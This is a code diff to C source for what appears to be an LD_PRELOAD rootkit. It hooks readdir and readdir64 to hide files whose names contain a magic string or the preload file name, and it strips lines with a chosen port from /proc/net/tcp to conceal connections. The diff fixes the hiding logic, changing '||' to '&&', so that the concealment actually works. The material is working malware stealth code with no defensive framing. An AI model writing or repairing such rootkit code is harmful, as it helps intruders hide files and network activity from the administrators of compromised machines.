@@ -80,7 +80,6 @@ void hijack_proc_net_tcp(FILE* tmp, const char *path, const char* mode) {
             if(strstr(buff, HEX_PORT) == NULL)
                 fputs(buff, tmp);
         }
-        fflush(old_file);
         fclose(old_file);
         free(buff);
         buff = NULL;
@@ -95,7 +94,7 @@ struct dirent* readdir(DIR *dir) {
     if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
     while((dir_ = old_readdir(dir))) {
         if(strstr(dir_->d_name, MAGIC_STRING) == NULL
-        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
+        && strstr(dir_->d_name, PRELOAD_FILE) == NULL)
             break;
     }
     return dir_;
@@ -108,7 +107,7 @@ struct dirent64* readdir64(DIR *dir) {
     if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     while((dir_ = old_readdir64(dir))) {
         if(strstr(dir_->d_name, MAGIC_STRING) == NULL
-        || strstr(dir_->d_name, PRELOAD_FILE) == NULL)
+        && strstr(dir_->d_name, PRELOAD_FILE) == NULL)
             break;
     }
     return dir_;
